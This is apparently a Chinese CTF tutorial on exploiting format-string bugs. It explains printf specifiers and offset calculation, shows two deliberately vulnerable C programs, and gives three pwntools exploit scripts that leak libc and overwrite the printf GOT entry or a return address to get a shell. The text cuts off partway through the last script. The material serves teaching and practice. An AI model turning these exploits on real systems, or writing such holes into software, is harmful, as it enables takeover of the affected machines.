style="text-align:center">#</td><td>与<code>x/X</code>组合表示以<code>0x???</code>的形式输出，与<code>g/G</code>组合表示不省略小数结尾的<code>0</code></td></tr><tr><td style="text-align:center">0</td><td>表示使用0作为填充符号(仅右对齐时有效)</td></tr><tr><td style="text-align:center">*</td><td>将参数中最前面的整数作为输出数据的最小长度 (最大为<code>2147483647</code>)</td></tr><tr><td style="text-align:center">0~9</td><td>将字符串转换后的整数作为输出数据的最小长度 (最大为<code>2147483647</code>，为负数时表示右对齐)</td></tr><tr><td style="text-align:center">$</td><td>通过<code>$</code>前的数字获取参数的索引值，用于指定占位符处理的数据</td></tr><tr><td style="text-align:center">.</td><td>.数字 用来指定浮点数精度 或 字符串输出的最大长度</td></tr></tbody></table><table><thead><tr><th style="text-align:center">类型</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:center">x</td><td style="text-align:left">将无符号整型以全小写十六进制的形式输入输出</td></tr><tr><td style="text-align:center">X</td><td style="text-align:left">将无符号整型以全大写十六进制的形式输入输出</td></tr><tr><td style="text-align:center">o</td><td style="text-align:left">将无符号整型以八进制的形式输入输出</td></tr><tr><td style="text-align:center">u</td><td style="text-align:left">将无符号整型以十进制的形式输入输出</td></tr><tr><td style="text-align:center">d</td><td style="text-align:left">将有符号整型以十进制的形式输入输出</td></tr><tr><td style="text-align:center">i</td><td style="text-align:left">输入输出有符号整型(将开头为0的数字识别为八进制，将开头为0x的数字识别为十六进制)</td></tr><tr><td style="text-align:center">f</td><td style="text-align:left">以定点数表示法输出浮点数 (当浮点数 为 无限浮点数时输出<code>inf</code>,当 浮点数 无法作为数字处理时输出<code>nan</code>)</td></tr><tr><td style="text-align:center">F</td><td style="text-align:left">以定点数表示法输出浮点数 (当浮点数 为 无限浮点数时输出<code>INF</code>,当 浮点数 无法作为数字处理时输出<code>NAN</code>)</td></tr><tr><td style="text-align:center">e</td><td style="text-align:left">以指数表示法输出浮点数 (当浮点数 为 无限浮点数时输出<code>inf</code>,当 浮点数 无法作为数字处理时输出<code>nan</code>)</td></tr><tr><td style="text-align:center">E</td><td style="text-align:left">以指数表示法全大写输出浮点数 (当浮点数 为 无限浮点数时输出<code>INF</code>,当 浮点数 无法作为数字处理时输出<code>NAN</code>)</td></tr><tr><td style="text-align:center">g</td><td style="text-align:left">自动选择使用定点数或指数输出浮点数(效果为<code>f</code>和<code>e</code>的结合体)</td></tr><tr><td style="text-align:center">G</td><td style="text-align:left">自动选择使用定点数或指数输出浮点数(效果为<code>F</code>和<code>E</code>的结合体)</td></tr><tr><td style="text-align:center">a</td><td style="text-align:left">以十六进制的形式全小写输出浮点数(当小数为无限小数时输出<code>inf</code>,当小数无法作为数字处理时输出<code>nan</code>)</td></tr><tr><td style="text-align:center">A</td><td style="text-align:left">以十六进制的形式全大写输出浮点数(当小数为无限小数时输出<code>INF</code>,当小数无法作为数字处理时输出<code>NAN</code>)</td></tr><tr><td style="text-align:center">s</td><td style="text-align:left">输出指定地址中的数据 (以<code>\x00</code>截断) 输入时以<code>空格</code>或<code>\n</code>为截断</td></tr><tr><td style="text-align:center">S</td><td style="text-align:left">输出指定地址中的数据 (以<code>\x00</code>或无法识别的数值截断)，输入时以<code>空格</code>或<code>\n</code>为截断，每四字节为一个字符输入输出</td></tr><tr><td style="text-align:center">p</td><td style="text-align:left">以十六进制的形式输出 地址/整数 (当 地址/整数为 0 时输出 <code>(nil)</code> )</td></tr><tr><td style="text-align:center">c</td><td style="text-align:left">以字符的形式输入输出数据</td></tr><tr><td style="text-align:center">n</td><td style="text-align:left">将已经输出的数据长度 写入指定地址</td></tr><tr><td style="text-align:center">====</td><td style="text-align:left">=============================================================================</td></tr></tbody></table><blockquote><p>使用 f/F/e/E/g/G 输入 都可以识别 定点数表示法 和 指数表示法</p></blockquote><p>计算偏移<br>-&gt; x86_64<br>—&gt; 通过 (需要使用的地址-调用printf时的rsp)/8+6 获得<br>—&gt; 因为printf参数中除第一个为需要格式化的字符串，其他都是参数，<br>—&gt; 如果要获取rsi,rdx,rcx,r8,r9寄存器的值就使用 <code>0 &lt; s &lt; 6</code> 的偏移<br>-&gt; x86<br>—&gt; 通过 (需要使用的地址-调用printf时的esp)/4 获得</p><p>通过<code>n</code>进行任意写，通过<code>s</code>进行任意地址读，通过<code>p</code>获取栈中的数据</p><h2 id="栈中格式化字符串">栈中格式化字符串</h2><blockquote><p>在栈中的格式化字符串比较简单，因为可以通过字符串中的地址，达到任意地址读写</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/* 示例代码 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> a[<span class="hljs-number">0x100</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">do</span>&#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,a);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(a,<span class="hljs-string">&quot;exit&quot;</span>,<span class="hljs-number">4</span>))&#123;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(a);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-comment">/* 编译命令</span><br><span class="hljs-comment">    gcc pwn_format.c  -no-pie -o pwn_format </span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/pwn-format.jpg" srcset="/img/loading.gif" lazyload alt="main函数" title="main函数代码(在此之前都是初始化变量的代码)"><br><img src="/img/blog_img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/pwn-format-1.jpg" srcset="/img/loading.gif" lazyload alt="main函数栈布局" title="main函数栈布局"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    因为 main 函数是由 __libc_start_main 函数调用，</span><br><span class="hljs-string">    那么在栈中就一定存在 __libc_start_main 函数的地址，</span><br><span class="hljs-string">    通过获取 __libc_start_main 函数的地址可以获取到 libc的基地址 ，</span><br><span class="hljs-string">    然后通过基地址获取 system 函数的地址，</span><br><span class="hljs-string">    再设置程序 got表 中 printf 项的值为 system 函数地址，</span><br><span class="hljs-string">    这样每次在执行 printf 函数时就会执行 system 函数</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-string">&quot;&quot;&quot; %41$p 计算过程</span><br><span class="hljs-string">    去除寄存器占用的 5 个参数，</span><br><span class="hljs-string">    那么字符串开头的偏移为 %6$p,</span><br><span class="hljs-string">    因为main函数的栈占用 0x110 字节，</span><br><span class="hljs-string">    再加上 push rbp ，所占用的 8 字节，</span><br><span class="hljs-string">    格式化的字符串开头到 __libc_start_main 之间 0x118 字节的数据，</span><br><span class="hljs-string">    所以 __libc_start_main 函数地址的偏移就为 0x118/8+6=41 </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn_format&#x27;</span>,checksec=<span class="hljs-literal">False</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="hljs-literal">False</span>)<br>p=process(<span class="hljs-string">&#x27;./pwn_format&#x27;</span>)<br>printf_got=e.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(printf_got))<br>p.sendline(<span class="hljs-string">&#x27;%41$p&#x27;</span>)<br>libc.address=<span class="hljs-built_in">int</span>(p.read(),<span class="hljs-number">16</span>)-libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]-<span class="hljs-number">213</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>data=p64(system)<br>fs=&#123;&#125;<br>n=[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>]<br>i=<span class="hljs-number">7</span><br><span class="hljs-keyword">while</span> i&gt;-<span class="hljs-number">1</span>:<br>    fs[i]=<span class="hljs-built_in">ord</span>(data[i])<br>    payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>*i+p64(printf_got+i)[:-<span class="hljs-number">1</span>]<br>    p.sendline(payload)<br>    i=i-<span class="hljs-number">1</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    构造栈，使栈中存有 printf.got~printf.got+7 这八个地址</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>n.sort(key=<span class="hljs-keyword">lambda</span> d:fs[d])<br>payload=<span class="hljs-string">&#x27;&#x27;</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> i&lt;<span class="hljs-number">8</span>:<br>    <span class="hljs-keyword">if</span> fs[n[i]]==<span class="hljs-number">0</span>:<br>        payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">18</span>+n[i])+<span class="hljs-string">&#x27;$hhn&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> fs[n[i]]-fs[n[i-<span class="hljs-number">1</span>]]==<span class="hljs-number">0</span>:<br>            payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">18</span>+n[i])+<span class="hljs-string">&#x27;$hhn&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(fs[n[i]]-fs[n[i-<span class="hljs-number">1</span>]])+<span class="hljs-string">&#x27;c%&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">18</span>+n[i])+<span class="hljs-string">&#x27;$hhn&#x27;</span><br>    i=i+<span class="hljs-number">1</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    这里是按照 system函数地址中每个字节所表示的数值，从小到大排列，防止修改时互相干扰</span><br><span class="hljs-string">    一般格式化字符串修改的数据宽度尽量要小，</span><br><span class="hljs-string">    因为数据宽度越大，表示在此之前输出的长度越长，</span><br><span class="hljs-string">    可能会导致将payload发送到靶机之后，</span><br><span class="hljs-string">    本地窗口一直在获取靶机中输出的内容，</span><br><span class="hljs-string">    这种情况非常浪费时间</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="非栈中格式化字符串">非栈中格式化字符串</h2><blockquote><p>堆中的格式化字符串比较麻烦<br>需要的条件为栈中存在 a 指向 b ，且b只有低四字节与a不同，<br>这时可以通过a修改b，然后利用b，在栈中创建一个指向某个区域的地址，<br>以此来达到任意地址读写</p></blockquote><p>一般存在两次函数调用操作时可以达到条件如 函数a调用函数b;函数b调用函数c<br>但 __libc_start_main 调用main,main调用某个函数除外，<br>因为__libc_start_main到main函数时储存在栈中的rbp/ebp为0，无法组成链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 样例代码 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">(<span class="hljs-type">char</span> *b)</span>&#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%40s&quot;</span>,b);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(b,<span class="hljs-string">&quot;exit&quot;</span>,<span class="hljs-number">4</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(b);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;nonono\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">func</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> *b=(<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>);;<br>    <span class="hljs-keyword">do</span>&#123;<br>        <span class="hljs-keyword">if</span> (vuln(b)==<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stderr</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> a[<span class="hljs-number">0x20</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input username:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%20s&quot;</span>,a);<br>    <span class="hljs-built_in">printf</span>(a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&#x27;s password:&quot;</span>);<br>    func();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/pwn-format1-1.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/pwn-format1-2.jpg" srcset="/img/loading.gif" lazyload alt="main函数栈布局" title="main函数栈布局"></p><p><img src="/img/blog_img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/pwn-format1-3.jpg" srcset="/img/loading.gif" lazyload alt="func函数代码" title="func函数代码"></p><p><img src="/img/blog_img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/pwn-format1-4.jpg" srcset="/img/loading.gif" lazyload alt="func函数栈布局" title="func函数栈布局"></p><p><img src="/img/blog_img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/pwn-format1-5.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数代码" title="vuln函数代码"></p><p><img src="/img/blog_img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/pwn-format1.jpg" srcset="/img/loading.gif" lazyload alt="泄露栈中数据" title="泄露栈中数据"><br>先通过多个 %p 泄露栈中的数据，用来查找可以利用的地址</p><p>这个样例符合条件，其中<code>main</code>函数调用<code>func</code>函数,<code>func</code>函数调用<code>vuln</code>函数<br>这样在栈中 至少保存了<code>main</code>函数的<code>rbp</code>与<code>func</code>函数的<code>rbp</code><br>而<code>func</code>函数的<code>rbp</code>指向的地址储存的是<code>main</code>函数的<code>rbp</code>的值<br>刚好形成一个链表</p><p>在这个样例中，因为可以利用栈达到任意地址读写，做法也就多种多样了<br>这里演示了控制返回地址为<code>gadget</code>获取<code>shell</code>，还可以通过设置<code>got表</code>调用<code>system</code>函数</p><h3 id="第一种">第一种</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    因为是在栈中，可以控制函数的返回地址</span><br><span class="hljs-string">    这个攻击代码中，设置main函数返回地址为 libc中调用execve(&quot;/bin/sh&quot;)的代码地址</span><br><span class="hljs-string">    还要把储存__libc_start_main函数rbp指针的位置写入新的rbp</span><br><span class="hljs-string">    而且这个rbp一定要大于 rsp且处于可写地址,否则会导致程序报错中断</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">for</span> gadget <span class="hljs-keyword">in</span> [<span class="hljs-number">0xde78c</span>,<span class="hljs-number">0xde78f</span>,<span class="hljs-number">0xde792</span>]:<br>    libc=ELF(<span class="hljs-string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="hljs-literal">False</span>)<br>    e=ELF(<span class="hljs-string">&#x27;./pwn_format&#x27;</span>,checksec=<span class="hljs-literal">False</span>)<br>    p=process(<span class="hljs-string">&#x27;./pwn_format&#x27;</span>)<br>    libc_ind=<span class="hljs-number">13</span><br>    p.read()<br>    p.sendline(<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(libc_ind)+<span class="hljs-string">&#x27;$p&#x27;</span>)<br>    c=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;\&#x27;s&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(c))<br><br>    libc.address=c-<span class="hljs-number">213</span>-libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>    sind=<span class="hljs-number">8</span><br>    eind=<span class="hljs-number">12</span><br>    p.readuntil(<span class="hljs-string">&#x27;password:&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;%&#123;&#125;$p.%&#123;&#125;$p&#x27;</span>.<span class="hljs-built_in">format</span>(sind,eind))<br>    data=p.read()[:-<span class="hljs-number">7</span>].split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>    s1=<span class="hljs-built_in">int</span>(data[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>)<br>    s2=<span class="hljs-built_in">int</span>(data[<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(s1),<span class="hljs-built_in">hex</span>(s2))<br><br>    ori=s2&amp;<span class="hljs-number">0xff</span><br>    ret=ori<br>    one_gadget=p64(libc.address+gadget)<br>    data=p64(s1+<span class="hljs-number">0x200</span>)+one_gadget<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address+gadget))<br>    i=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i&lt;<span class="hljs-number">16</span>:<br>        payload=<span class="hljs-string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(ret+i,sind)<br>        p.sendline(payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(data[i])==<span class="hljs-number">0</span>:<br>            payload=<span class="hljs-string">&#x27;%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(eind)<br>            <br>        <span class="hljs-keyword">else</span>:<br>            payload=<span class="hljs-string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(data[i]),eind)<br>        p.sendline(payload)<br>        i=i+<span class="hljs-number">1</span><br>    payload=<span class="hljs-string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(ori,sind)<br>    p.sendline(payload)<br>    p.interactive()<br></code></pre></td></tr></table></figure><h3 id="第二种">第二种</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    因为 printf 函数与 system 函数属于同一个 libc，所以两个函数的真实地址也相近，</span><br><span class="hljs-string">    想要将printf改成system 函数，只需要修改低两个字节，</span><br><span class="hljs-string">    所以我们将 printf.got 与 printf.got+2 写入栈中</span><br><span class="hljs-string">    然后再 将 printf.got 中储存的低四字节替换为 system函数地址 的低四字节</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="hljs-literal">False</span>)<br>e=ELF(<span class="hljs-string">&#x27;./pwn_format&#x27;</span>,checksec=<span class="hljs-literal">False</span>)<br>p=process(<span class="hljs-string">&#x27;./pwn_format&#x27;</span>)<br>libc_ind=<span class="hljs-number">13</span><br>p.read()<br>p.sendline(<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(libc_ind)+<span class="hljs-string">&#x27;$p&#x27;</span>)<br>c=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;\&#x27;s&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(c))<br><br>libc.address=c-<span class="hljs-number">213</span>-libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>printf_got=e.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>sind=<span class="hljs-number">8</span><br>eind=<span class="hljs-number">12</span><br>p.readuntil(<span class="hljs-string">&#x27;password:&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;%&#123;&#125;$p.%&#123;&#125;$p&#x27;</span>.<span class="hljs-built_in">format</span>(sind,eind))<br>data=p.read()[:-<span class="hljs-number">7</span>].split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>s1=<span class="hljs-built_in">int</span>(data[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>)<br>s2=<span class="hljs-built_in">int</span>(data[<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(s1),<span class="hljs-built_in">hex</span>(s2))<br><br>ori=s2&amp;<span class="hljs-number">0xff</span><br>ret=ori<br>data=p64(printf_got)+p64(printf_got+<span class="hljs-number">2</span>)<br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> i&lt;<span class="hljs-number">16</span>:<br>    payload=<span class="hljs-string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(ret+i,sind)<br>    p.sendline(payload)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(data[i])==<span class="hljs-number">0</span>:<br>        payload=<span class="hljs-string">&#x27;%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(eind)<br>    <span class="hljs-keyword">else</span>:<br>        payload=<span class="hljs-string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(data[i]),eind)<br>    p.sendline(payload)<br>    i=i+<span class="hljs-number">1</span><br>payload=<span class="hljs-string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(ori,sind)<br>p.sendline(payload)<br><br>e=&#123;<span class="hljs-number">0</span>:system&amp;<span class="hljs-number">0xffff</span>,<span class="hljs-number">1</span>:((system&amp;<span class="hljs-number">0xffff0000</span>)&gt;&gt;<span class="hljs-number">16</span>)&#125;<br>n=[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>]<br>n.sort(key=<span class="hljs-keyword">lambda</span> d:e[d])<br><br>payload=<span class="hljs-string">&#x27;%&#123;&#125;c%&#123;&#125;$hn%&#123;&#125;c%&#123;&#125;$hn&#x27;</span>.<span class="hljs-built_in">format</span>(e[n[<span class="hljs-number">0</span>]],<span class="hljs-number">20</span>+n[<span class="hljs-number">0</span>],e[n[<span class="hljs-number">1</span>]]-e[n[<span class="hljs-number">0</span>]],<span class="hljs-number">20</span>+n[<span class="hljs-number">1</span>])<br><span 